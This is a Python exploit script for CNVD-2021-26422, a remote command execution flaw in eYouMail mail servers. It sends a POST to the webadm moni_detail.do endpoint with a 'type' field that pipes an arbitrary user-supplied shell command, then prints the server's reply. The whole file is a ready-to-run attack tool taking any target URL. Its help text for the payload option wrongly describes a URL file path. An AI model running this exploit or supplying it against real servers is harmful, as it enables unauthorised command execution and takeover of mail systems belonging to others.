#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, argparse

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：eYouMail V8.3-V8.13的部分二次开发版本".center(30))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

def eYouMail_EXP(url, payload):
    target_url = f"{url}//webadm/?q=moni_detail.do&action=gragh"
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "accept": "*/*",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1"
    }
    payload = '''type="|{0}||"'''.format(payload)
    try:
        res = requests.post(target_url, headers=headers, data=payload, timeout=3).text
        print(res)
    except Exception as e:
        print(f"[n] {url}不存在该漏洞！")
        return url

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="CNVD-2021-26422_eYouMail_RCE EXP")
    parser.add_argument(
        '-u', '--url', type=str, required='True',
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-p', '--payload', type=str, required='True',
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    eYouMail_EXP(args.url, args.payload)
    print("\n[done] 命令执行完成。")